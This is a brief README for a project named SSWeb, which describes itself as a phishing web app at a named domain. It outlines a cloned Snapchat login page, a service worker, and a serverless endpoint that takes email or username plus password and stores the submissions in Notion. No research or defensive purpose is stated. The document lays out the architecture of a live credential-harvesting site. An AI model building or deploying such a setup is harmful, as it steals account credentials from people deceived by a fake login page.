# SSWeb

Phishing/web app. Visit `www.justsnapvote.tech`.

- `server.js` — Express static-only server (no `/api/submit`).
- `api/submit.js` — Vercel serverless function for `POST /api/submit`. Accepts `email` OR `username` + `password`, writes to Notion.
- `vercel.json` — declares both as builds; routes `/api/submit` to the function, catch-all to `server.js`.
- `public/` — static assets (snapchat login page, service worker, scripts).
